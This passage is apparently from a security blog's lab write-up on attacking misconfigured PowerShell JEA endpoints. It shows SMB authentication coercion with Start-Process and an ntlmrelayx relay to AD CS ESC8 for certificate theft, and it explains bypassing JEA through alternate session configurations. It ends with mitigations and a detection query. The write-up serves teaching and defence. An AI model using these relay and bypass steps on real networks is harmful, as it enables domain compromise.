+[*] Saving ticket in Administrator@cifs_PORTICUS.jess.kingdom@JESS.KINGDOM.ccache
+</code></pre></div></div>
+
+<p>We can then use the <code class="language-plaintext highlighter-rouge">ccache</code> file to authenticate to <code class="language-plaintext highlighter-rouge">PORTICUS</code>, and list shares:</p>
+
+<p><img src="/assets/img/sincon-2/0d58f32f8b005351382032767aa97657.png" alt="" /></p>
+
+<h3 id="method-3-smb-relay-to-esc8">Method 3: SMB Relay to ESC8</h3>
+
+<p>With reference to the <a href="https://blog.async.sg/sincon-2025-adcs-relay.html">first writeup</a>, we can also relay the <code class="language-plaintext highlighter-rouge">SMB</code> authentication to <code class="language-plaintext highlighter-rouge">ESC8</code> using the same method as before. This is particularly useful if you don’t have access to a primitive to send HTTP authentication, such as <code class="language-plaintext highlighter-rouge">Invoke-WebRequest</code>.</p>
+
+<h4 id="sending-smb-authentication">Sending SMB Authentication</h4>
+
+<p>An SMB share path can be specified in the <code class="language-plaintext highlighter-rouge">-FilePath</code> parameter to send SMB authentication to the share:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[doros_archivon@porticus.jess.kingdom] PS&gt; Start-Process -FilePath "\\TABULARIUM.jess.kingdom\gatari$" -Wait
+</code></pre></div></div>
+
+<p>Any other commandlet can be used, such as <code class="language-plaintext highlighter-rouge">-FilePath cmd.exe -ArgumentList net view ...</code> to enumerate the shares on <code class="language-plaintext highlighter-rouge">TABULARIUM</code> - which also sends the SMB authentication to <code class="language-plaintext highlighter-rouge">TABULARIUM</code> but spawns a <code class="language-plaintext highlighter-rouge">cmd.exe</code>.</p>
+
+<h4 id="relaying-to-esc8">Relaying to ESC8</h4>
+
+<p>We can then relay the SMB authentication to <code class="language-plaintext highlighter-rouge">ESC8</code> using <code class="language-plaintext highlighter-rouge">ntlmrelayx.py</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py -t 'http://palace-dc.jess.kingdom/certsrv/certfnsh.asp' -smb2support --adcs --template 'Machine' --no-http-server
+</code></pre></div></div>
+
+<p><img src="/assets/img/sincon-2/f345fe5a78c540612cceb3a0a2635e3d.png" alt="" /></p>
+
+<p>Then, we can exchange the acquired certificate for the NTLM hash of <code class="language-plaintext highlighter-rouge">PORTICUS</code>:</p>
+
+<p><img src="/assets/img/sincon-2/56d6fcc4e5c4cf05746764eccc1cd4d7.png" alt="" /></p>
+
+<p>From here, there are lots of ways to compromise fully <code class="language-plaintext highlighter-rouge">PORTICUS</code>.</p>
+
+<h2 id="configurationname-pitfalls">ConfigurationName Pitfalls</h2>
+
+<p>In this lab, the JEA configured on <code class="language-plaintext highlighter-rouge">PORTICUS</code> was registered to overwrite all 4 default PowerShell session configurations.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Register-PSSessionConfiguration</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">microsoft.powershell.workflow</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$psscPath</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> 
+</span><span class="n">Register-PSSessionConfiguration</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">microsoft.powershell32</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$psscPath</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> 
+</span><span class="n">Register-PSSessionConfiguration</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">microsoft.windows.servermanagerworkflows</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$psscPath</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> 
+</span><span class="n">Register-PSSessionConfiguration</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">Microsoft.PowerShell</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$psscPath</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p>Earlier, I mentioned that the <code class="language-plaintext highlighter-rouge">Microsoft.PowerShell</code> configuration is the default configuration used when connecting to a WinRM endpoint. However, it is also possible to connect to WinRM endpoints remotely using any of the other session configurations, such as <code class="language-plaintext highlighter-rouge">microsoft.powershell32</code>.</p>
+
+<p>For example, the <code class="language-plaintext highlighter-rouge">gatari</code> user is a local administrator on <code class="language-plaintext highlighter-rouge">PALACE-DC</code> where they are able to connect to the WinRM endpoint using both <code class="language-plaintext highlighter-rouge">microsoft.powershell</code> and <code class="language-plaintext highlighter-rouge">microsoft.powershell32</code> configurations.</p>
+
+<p><img src="/assets/img/sincon-2/6db2d306f1e3ac5819df35471873d048.png" alt="" /></p>
+
+<p>The problem arises when the <code class="language-plaintext highlighter-rouge">Microsoft.PowerShell</code> configuration is overwritten with a custom JEA configuration, but the system administrator forgets to overwrite the other session configurations. This means that users can still connect to the WinRM endpoint using the other session configurations, which may not have the same restrictions as the JEA configuration.</p>
+
+<p>Consider the same configuration file used to register the JEA session configuration on <code class="language-plaintext highlighter-rouge">PORTICUS</code> was applied on <code class="language-plaintext highlighter-rouge">TABULARIUM</code> but only on the <code class="language-plaintext highlighter-rouge">Microsoft.PowerShell</code> configuration.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Register-PSSessionConfiguration</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">Microsoft.PowerShell</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$psscPath</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p>Logically, the default connection to the WinRM endpoint will be protected by JEA.</p>
+
+<p><img src="/assets/img/sincon-2/aeae44b3674607bc77fe516862e8bc7a.png" alt="" /></p>
+
+<p>However attempting to use any other configuration, completely bypasses the JEA restrictions. Although, since these configurations are not configured with <code class="language-plaintext highlighter-rouge">-RunAsVirtualAccount</code>, the user will retain their own privileges on the remote machine, instead of local administrator privileges.</p>
+
+<p><img src="/assets/img/sincon-2/11bffd9d604fd590fd838c8c8981538f.png" alt="" /></p>
+
+<h2 id="mitigations--detections">Mitigations &amp; Detections</h2>
+
+<p>While JEA does open up a lot of attack vectors, it is important to note that it is not inherently insecure. The security of JEA depends on the configuration and the role capabilities defined in the role capability files.</p>
+
+<p>Aside from the <a href="https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.5">security considerations mentioned by Microsoft</a>, you may also find that implementing the following mitigations and detections can help to reduce the attack surface of JEA.</p>
+
+<h3 id="regularly-review-role-capabilities">Regularly Review Role Capabilities</h3>
+
+<p>In this writeup, the <code class="language-plaintext highlighter-rouge">Start-Process</code> commandlet was allowed on the JEA endpoint. While this was an exaggeration to demonstrate the attack vector, it is important to note that seemingly harmless commandlets such as <code class="language-plaintext highlighter-rouge">Get-Service</code> can be used to send SMB authentication to other machines, which can then be chained to other attack vectors such as ESC8.</p>
+
+<p>If you ever have a purpose for these dangerous commandlets, it’s highly recommended to restrict the parameters that can be used with them. For example, you can restrict the <code class="language-plaintext highlighter-rouge">Start-Process</code> commandlet to only allow the user to run an executable at <code class="language-plaintext highlighter-rouge">C:\Projects\HealthCheck.exe</code>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">@{</span><span class="w">
+    </span><span class="nx">Name</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="s1">'Start-Process'</span><span class="w">
+    </span><span class="nx">Parameters</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'FilePath'</span><span class="p">;</span><span class="w"> </span><span class="nx">ValidateSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s1">'C:\Projects\HealthCheck.exe'</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="monitoring-virtual-accounts">Monitoring Virtual Accounts</h3>
+
+<p>As mentioned earlier, these virtual accounts associated with JEA commands are not meant to be used for extended periods of time. It is also important to be conscious of what commands are allowed to be run by these virtual accounts.</p>
+
+<p>For example, if the following role capability file is registered. It is highly unlikely for any process to be owned by <code class="language-plaintext highlighter-rouge">winrm virtual users\winrm va_x_computername_username</code>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">@{</span><span class="w">
+    </span><span class="nx">Name</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="s1">'Start-Process'</span><span class="w">
+    </span><span class="nx">Parameters</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'FilePath'</span><span class="p">;</span><span class="w"> </span><span class="nx">ValidateSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s1">'C:\Projects\HealthCheck.exe'</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Detection and monitoring capabilities can then be used to alert on any processes that are owned by these virtual accounts, as they are not meant to be used for extended periods of time.</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">event</span><span class="p">.</span><span class="n">code</span><span class="p">:</span> <span class="nv">"1"</span> <span class="k">and</span> <span class="n">winlog</span><span class="p">.</span><span class="k">user</span><span class="p">.</span><span class="n">name</span><span class="p">:</span> <span class="nv">"winrm va_*"</span> <span class="k">and</span> <span class="k">not</span> <span class="n">process</span><span class="p">.</span><span class="n">name</span><span class="p">:</span> <span class="p">(</span><span class="nv">"HealthCheck.exe"</span> <span class="k">or</span> <span class="nv">"wsmprovhost.exe"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="auditing">Auditing</h3>
+
+<p>JEA also has built-in auditing capabilities that can be enabled to log all commands executed in a JEA session. This can be done by setting the <code class="language-plaintext highlighter-rouge">TranscriptDirectory</code> parameter in the session registration.</p>
+
+<p>More information can be found: <a href="https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/audit-and-report?view=powershell-7.5">here</a></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>While JEA is a powerful tool for restricting administrative access, it can also lead to unintended consequences if not properly configured. For example, the <code class="language-plaintext highlighter-rouge">JESS\Doros_ARCHIVON</code> user is not a local administrator on <code class="language-plaintext highlighter-rouge">PORTICUS</code>, but the JEA session allows it to execute commands as a local administrator, which opened up the possibility for privilege escalation.</p>
+
+<p>A lot of work went into building this lab, but it was worth it - many participants got hands-on experience with JEA for the first time, and that exposure could be useful during future engagements.</p>
+
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+
+        if (content.classList.contains('expanded')) {
+            content.classList.remove('expanded');
+            button.classList.remove('expanded');
+            button.innerHTML = 'Table of Contents';
+        } else {
+            content.classList.add('expanded');
+            button.classList.add('expanded');
+            button.innerHTML = 'Table of Contents';
+        }
+    }
+</script>
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/ASYNC-Security">ASYNC-Security</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
